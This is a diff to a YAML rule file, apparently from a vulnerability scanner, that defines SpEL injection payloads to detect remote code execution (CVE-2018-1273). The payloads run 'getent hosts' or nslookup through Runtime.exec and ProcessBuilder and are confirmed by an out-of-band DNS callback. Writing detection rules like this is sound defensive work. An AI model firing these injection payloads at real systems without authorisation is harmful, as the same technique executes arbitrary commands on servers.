@@ -1,11 +1,16 @@
+collect:
+  - uniq:
+    - [URI]
+
 generate:
   - payload:
-    - T(java.lang.Runtime).getRuntime().exec("getent${IFS}DNS_MARKER")
-    - "#this.getClass().forName('java.lang.Runtime').getRuntime().exec('getenv${IFS}DNS_MARKER')"
-    - new java.lang.ProcessBuilder({'nslookup DNS_MARKER'}).start()
+     - "T(java.lang.Runtime).getRuntime().exec('getent hosts DNS_MARKER')/wlrm"
+     - "new java.lang.ProcessBuilder({'getent hosts DNS_MARKER'}).start()"
+
 detect:
   - oob:
     - dns
+
 meta-info:
   - type: rce
   - threat: 95
@@ -19,5 +24,3 @@ meta-info:
     - OWASP Top 10
     - OWASP
     - CVE-2018-1273
-    - CVE-2017-8046
-    - CVE-2017-17485
